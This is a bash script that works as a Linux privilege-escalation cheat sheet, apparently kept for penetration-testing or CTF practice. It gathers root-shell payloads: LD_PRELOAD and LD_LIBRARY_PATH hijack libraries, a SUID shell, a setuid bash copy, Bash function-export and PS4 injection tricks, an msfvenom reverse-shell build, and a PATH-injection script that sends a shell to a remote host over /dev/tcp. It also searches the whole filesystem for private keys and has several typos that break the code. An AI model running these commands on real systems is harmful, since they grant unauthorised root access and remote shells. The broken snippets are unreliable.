#!/bin/bash - 
#===============================================================================
#
#          FILE: linux.sh
# 
#         USAGE: ./linux.sh 
# 
#   DESCRIPTION: 
# 
#       OPTIONS: ---
#  REQUIREMENTS: ---
#          BUGS: ---
#         NOTES: ---
#        AUTHOR: Amit Agarwal (aka), 
#  ORGANIZATION: Individual
#       CREATED: 01/01/2021 13:13
#      REVISION:  ---
#===============================================================================

set -o nounset                              # Treat unset variables as an error

## sudo permissions
sudo -l

## Create password
mkpasswd -m sha-512 raj77in

## SUID/GUID
find / -type f -a \( -perm -u+s -o -perm -g+s \) -ls 2>/dev/null

## Cronjobs
# Stabilize Shell
# Run pspy
# Ctrl+c

## Check for Private Keys
grep -R 'BEGIN OPENSSH PRIVATE KEY' /
find / -name \*id_rsa\*


## LD_PRELOAD
cat <<EOF >preload.c
#include <stdio.c>
#include <sys/types.h>
#include <stdlib.h>

void _init (void){
    unset(LD_PRELOAD);
    setresuid(0,0,0);
    system("/bin/bash -p");
}

EOF

gcc -fPIC -shared -nostartfiles -o ldpreload.so preload.c
sudo LD_PRELOAD=ldpreload.so <cmd>

## LD_LIBRARY_PATH
cat <<EOF >library.c

#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constuctor));

void hijack(){
    unsetrnv(LD_LIBRARY_PATH);
    setresuid(0,0,0);
    system("/bin/bash -p");
}

EOF
gcc -o lib.so -shared -pPIC lbrary.c
sudo LD_LIBRARY_PATH=. <cmd>

# SUID Binary
cat <<EOF >suid.c
#include <stdio.h>

int main (void) {
    setuid(0);
    system("/bin/bash -p");
    return 0;
}
EOF
gcc -o suid suid.c

## Bash < 4.2-048
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
<prog>

## rootbash
cp /bin/bash /usr/bin/rootbash; chmod 7777 /usr/bin/rootbash;
/usr/bin/rootbash -p

## msfvenom
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LIP LPORT=$LPORT -f elf -o elf.bin

## Tracing
strace -f -v -e execve <cmd> 2>&1 |grep exec
ltrace <cmd> 2>&1

## PATH Injection
cat <<EOF > prog
#!/bin/bash
bash -i &> /dev/tcp/$LIP/$LPORT 2>&1

EOF
export PATH=.:$PATH

## Strings
string <cmd>
<cmd>

## Bash debugging bash < 4.2-048
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /bin/rootbash; \
    chown root:root /bin/rootbash; chmod +s /bin/rootbash; )' \
    <cmd>

## NFS
showmount -e $IP
nmap -sV --script=nfs $IP
mount -o rw,vers=2 $IP:<share> /mnt/tmp


